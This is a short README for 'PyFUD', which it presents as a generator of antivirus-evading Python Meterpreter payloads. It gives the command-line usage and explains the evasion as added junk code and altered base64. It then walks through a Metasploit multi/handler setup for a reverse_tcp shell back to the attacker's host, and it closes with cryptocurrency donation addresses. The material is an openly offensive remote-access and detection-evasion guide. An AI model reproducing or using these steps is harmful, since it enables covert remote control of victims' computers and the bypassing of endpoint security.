# PyFUD
![Image](/image_2023-02-01_232544745.png)  
fully Undetectable payload generator for metasploit  
Usage:
`pyfud.py --host HOST --output OUTPUT file name --port PORT`  
the payload is made fully Undetectable by adding some junk code into the main program and some changes are made on the base64 string
tested on windows 10  
metasploit setup:  
`
msfconsole
`
  
`
use multi/handler
`
  
`
set payload python/meterpreter/reverse_tcp
`
  
`
set lport {port used to make payload}
`
  
`
set lhost {your local ip adress or just 0.0.0.0}
`
  
`
run
`

  
Feel free, any cent counts will really help :)  
BTC address:168vrx5UuJNfNuvoYe6qhmAZCvePW4VPj2  
usdt address (binance trc20): TKP9Ch8JELiqn7n5VdfGMNqJwW2wpZAYi3
